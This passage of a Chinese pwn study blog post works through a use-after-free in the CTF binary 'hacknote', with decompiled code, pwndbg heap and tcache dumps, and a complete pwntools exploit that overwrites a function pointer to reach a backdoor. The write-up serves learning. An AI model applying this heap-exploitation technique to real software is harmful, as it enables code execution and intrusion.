class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Full&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​先分配了一个堆空间，具体大小为数组 notelist 的单个元素的大小，之后就是让 noteliist 第一个元素指向一个函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(_DWORD *)*(&amp;notelist + i) = print_note_content;</span><br></pre></td></tr></table></figure><p>​估计第一个参数是一个函数指针，之后 malloc 第二个堆，地址赋给第二个参数，之后读取 size 大小的字符进入第二个堆块。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">v0 = (<span class="type">int</span>)*(&amp;notelist + i);</span><br><span class="line">*(_DWORD *)(v0 + <span class="number">4</span>) = <span class="built_in">malloc</span>(size);</span><br><span class="line"></span><br><span class="line">read(<span class="number">0</span>, *((<span class="type">void</span> **)*(&amp;notelist + i) + <span class="number">1</span>), size);</span><br></pre></td></tr></table></figure><p>​删除 note：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">del_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line">    <span class="built_in">free</span>(*(&amp;notelist + v1));</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Success&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​发现先后删除了两个堆块，一个是写入的堆块，也就是上面第二个生成的堆块，之后释放了第一个生成的堆块，也就是存放两个指针的那个堆块：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">free</span>(*((<span class="type">void</span> **)*(&amp;notelist + v1) + <span class="number">1</span>));</span><br><span class="line"><span class="built_in">free</span>(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure><p>​但之后没有对指针进行置零，存在 UAF 漏洞，因为 show 里存在 idx 参数，释放后如果申请大小差不多的堆块。</p><p>​之后是 print_note 函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">print_note</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v1; <span class="comment">// [esp+4h] [ebp-14h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">4</span>]; <span class="comment">// [esp+8h] [ebp-10h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Index :&quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">4u</span>);</span><br><span class="line">  v1 = atoi(buf);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt; <span class="number">0</span> || v1 &gt;= count )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;Out of bound!&quot;</span>);</span><br><span class="line">    _exit(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( *(&amp;notelist + v1) )</span><br><span class="line">    (*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​很显然，这里调用了那个堆块里的动态函数：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(*(<span class="type">void</span> (__cdecl **)(_DWORD))*(&amp;notelist + v1))(*(&amp;notelist + v1));</span><br></pre></td></tr></table></figure><p>​所以只需要想办法修改这里的函数指针即可 getshell。</p><p>​上 gdb 调一下，先申请两个堆块，之后 ctrl+c 执行 gdb 指令看看：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">r</span></span><br><span class="line">Starting program: /mnt/c/Users/20820/Downloads/hacknote</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :20</span><br><span class="line">Content :aaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :1</span><br><span class="line">Note size :30</span><br><span class="line">Content :AAA</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure><p>​之后查看下 heap 状态：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>​除开最开始的那个 size 为 0x190 的那位以外，其他的大致符合情况 ，两次都是先申请了一个堆块存放两个地址，然后申请另一个堆块来存放输入的内容，之后读一下 0x804b198 的内存：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b1b00804865b&lt;---这里两个数据，一个是函数指针，也就是0x0804865b，另一个就是输入地址的那个堆块的地址0x0804b1b0</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x000000000a616161</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1e00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x000000000a414141</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​这个函数在 IDA 里的地址是：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">.text:0804865B print_note_content proc near            ; DATA XREF: add_note+9A↓o</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B arg_0           = dword ptr  8</span><br><span class="line">.text:0804865B</span><br><span class="line">.text:0804865B ; __unwind &#123;</span><br><span class="line">.text:0804865B                 push    ebp</span><br><span class="line">.text:0804865C                 mov     ebp, esp</span><br><span class="line">.text:0804865E                 sub     esp, 8</span><br><span class="line">.text:08048661                 mov     eax, [ebp+arg_0]</span><br><span class="line">.text:08048664                 mov     eax, [eax+4]</span><br><span class="line">.text:08048667                 sub     esp, 0Ch</span><br><span class="line">.text:0804866A                 push    eax             ; s</span><br><span class="line">.text:0804866B                 call    _puts</span><br><span class="line">.text:08048670                 add     esp, 10h</span><br><span class="line">.text:08048673                 nop</span><br><span class="line">.text:08048674                 leave</span><br><span class="line">.text:08048675                 retn</span><br><span class="line">.text:08048675 ; &#125; // starts at 804865B</span><br><span class="line">.text:08048675 print_note_content endp</span><br></pre></td></tr></table></figure><p>​此时 bins 里啥都没有：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">tcachebins</span><br><span class="line">empty</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>​之后，我们分别释放掉两个堆，发现 heap 变了：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line">fd: 0x804b1a0</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>​释放掉了之后，读取 0x804b198 的内容：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30gx 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0804b01000000000</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b0100804b1a0</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​再看看这个：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">bins</span></span><br><span class="line">tcachebins</span><br><span class="line">0x10 [  2]: 0x804b1d0 —▸ 0x804b1a0 ◂— 0</span><br><span class="line">0x20 [  1]: 0x804b1b0 ◂— 0</span><br><span class="line">0x30 [  1]: 0x804b1e0 ◂— 0</span><br><span class="line">fastbins</span><br><span class="line">empty</span><br><span class="line">unsortedbin</span><br><span class="line">empty</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></table></figure><p>​完蛋，没注意到 tcache 给我保存了这些内容，不过不清楚是否存在影响，继续调一调看看吧，之后重新申请个堆</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">c</span></span><br><span class="line">Continuing.</span><br><span class="line">1</span><br><span class="line">Note size :8</span><br><span class="line">Content :aaaa</span><br><span class="line">Success !</span><br><span class="line">----------------------</span><br><span class="line">       HackNote</span><br><span class="line">----------------------</span><br><span class="line"> 1. Add note</span><br><span class="line"> 2. Delete note</span><br><span class="line"> 3. Print note</span><br><span class="line"> 4. Exit</span><br><span class="line">----------------------</span><br><span class="line">Your choice :^C</span><br></pre></td></tr></table></figure><p>​之后再看看 heap：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">heap</span></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b008</span><br><span class="line">Size: 0x190 (with flag bits: 0x191)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b198</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1a8</span><br><span class="line">Size: 0x20 (with flag bits: 0x21)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b1c8</span><br><span class="line">Size: 0x10 (with flag bits: 0x11)</span><br><span class="line"></span><br><span class="line">Free chunk (tcachebins) | PREV_INUSE</span><br><span class="line">Addr: 0x804b1d8</span><br><span class="line">Size: 0x30 (with flag bits: 0x31)</span><br><span class="line">fd: 0x00</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x804b208</span><br><span class="line">Size: 0x21df8 (with flag bits: 0x21df9)</span><br></pre></td></tr></table></figure><p>​0x804b198 这个地址的 chunk 被重新拿去用了，第二次申请的那个原本存放了函数指针和字符串指针的那个 chunk 被分配了，之前拿去作为存放内容的那两个 chunk 一个都没有被分配，之后读一下这个地址：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b198</span></span><br><span class="line">0x804b198:      0x0000001100000000      0x0000000a61616161</span><br><span class="line">0x804b1a8:      0x0000002100000000      0x0804b01000000000</span><br><span class="line">0x804b1b8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br><span class="line">0x804b1d8:      0x0000003100000000      0x0804b01000000000</span><br><span class="line">0x804b1e8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b1f8:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b208:      0x00021df900000000      0x0000000000000000</span><br><span class="line">0x804b218:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b228:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b238:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b248:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b258:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b268:      0x0000000000000000      0x0000000000000000</span><br><span class="line">0x804b278:      0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>​发现这里被输入的字符给占了，再去读一下这个 0x804b1c8：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_">pwndbg&gt; </span><span class="language-bash">x/30xg 0x804b1c8</span></span><br><span class="line">0x804b1c8:      0x0000001100000000      0x0804b1a00804865b</span><br></pre></td></tr></table></figure><p>​这里没有啥变化，依旧是指向输出函数的地址，以及指向某字符串的地址，0x804b198 这个地址的 chunk 之前编号为 0，因为地址更低，更先被分配，这个地址更高的作为编号 1，同时整个程序存在 backdoor：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">magic</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> system(<span class="string">&quot;cat /home/hacknote/flag&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>​所以只需要通过两次释放之后，再申请一个 0x8 之类比较小的，保证能够写入地址同时能够让分配到的 chunk 为同一个即可，然后申请的时候发送的数据为后门函数的地址即可，之后输出的时候它会自动调用后门程序：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = process(<span class="string">&#x27;./hacknote&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">addnote</span>(<span class="params">size, content</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">delnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">printnote</span>(<span class="params">idx</span>):</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(r)</span></span><br><span class="line">magic = <span class="number">0x08048986</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">20</span>, <span class="string">&quot;note1&quot;</span>) <span class="comment"># add note 0</span></span><br><span class="line">addnote(<span class="number">30</span>, <span class="string">&quot;note2&quot;</span>) <span class="comment"># add note 1</span></span><br><span class="line"></span><br><span class="line">delnote(<span class="number">0</span>) <span class="comment"># delete note 0</span></span><br><span class="line">delnote(<span class="number">1</span>) <span class="comment"># delete note 1</span></span><br><span class="line"></span><br><span class="line">addnote(<span class="number">8</span>, p32(magic)) <span class="comment"># add note 2</span></span><br><span class="line"></span><br><span class="line">printnote(<span class="number">0</span>) <span class="comment"># print note 0</span></span><br><span class="line">gdb.attach(r)</span><br><span class="line">r.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">#[*] Switching to interactive mode</span></span><br><span class="line"><span class="comment">#flag&#123;asd32as1-1d8g1r1hj5g4d4-9d54h3jyur4nfke1a&#125;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;pwn学习笔记10uaf&quot;&gt;&lt;a class=&quot;markdownIt-Anchor&quot; href=&quot;#pwn学习笔记10uaf&quot;&gt;#&lt;/a&gt; Pwn 学习笔记（10）–UAF：&lt;/h1&gt;
&lt;p&gt;​		UAF 就是 Use-After-Free，即一个指向堆块的指针被</summary>
      
    
